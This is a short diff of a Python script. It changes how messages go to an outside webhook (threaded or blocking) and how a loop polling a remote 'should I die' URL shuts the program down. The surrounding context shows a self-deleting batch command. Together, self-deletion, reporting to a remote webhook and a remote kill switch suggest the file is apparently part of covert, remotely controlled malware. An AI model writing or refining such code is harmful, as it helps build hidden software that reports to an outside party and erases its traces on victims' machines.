@@ -45,9 +45,13 @@ del "%~f0" > nul
         print("Self-delete failed:", e)
 
 # --- Webhook sender ---
-def send_webhook(content):
+def send_webhook(content, wait_for_response=False):
     try:
-        requests.post(WEBHOOK_URL, json={"content": content})
+        if wait_for_response:
+            response = requests.post(WEBHOOK_URL, json={"content": content}, timeout=10)
+            response.raise_for_status()  # Raise an error if it fails
+        else:
+            threading.Thread(target=lambda: requests.post(WEBHOOK_URL, json={"content": content}), daemon=True).start()
     except Exception as e:
         print("Failed to send webhook:", e)
 
@@ -81,8 +85,7 @@ def check_should_i_die_loop():
             response = requests.get(CHECK_URL, timeout=10)
             if response.status_code == 200 and response.text.strip().lower() == "yes":
                 print("Should die: yes. Sending shutdown message.")
-                send_webhook("Shutting down...")  # Final webhook message
-                time.sleep(1)  # Give a second to make sure webhook sends
+                send_webhook("Shutting down...", wait_for_response=True)  # <-- Block until sent
                 os._exit(0)  # Immediate hard exit
         except Exception as e:
             print("Failed to check shouldidie:", e)
